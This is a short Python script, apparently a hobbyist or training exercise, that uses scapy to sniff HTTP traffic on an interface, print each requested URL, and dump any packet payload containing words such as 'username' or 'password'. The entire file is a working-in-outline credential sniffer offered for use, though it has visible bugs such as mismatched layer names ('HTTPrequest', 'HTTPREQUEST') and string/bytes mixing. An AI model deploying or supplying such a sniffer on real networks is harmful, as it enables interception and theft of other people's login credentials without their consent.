# _author__ = MrT3st3r

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def display_urls(packet):
    return packet[http.HTTPrequest].Host + packet[http.HTTPREQUEST].Path
def get_credentials(packet):
    if packet.haslayer(scapy.Raw):  # filter bsed on the layer you need the info from
        load = packet[scapy.Raw].load
        keywords = ['username', 'password', 'user', 'login',
                    'pass']  # list of keywors which possibly we are interested in
        for el in keywords:
            if el in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = display_urls(packet)
        print('[+] HTTP Requerst ' + url)
        credential_info = get_credentials(packet)
        if credential_info:
            print('[+] Possble username/passwprd > ' + credential_info + '\n\n')

sniff("eth0")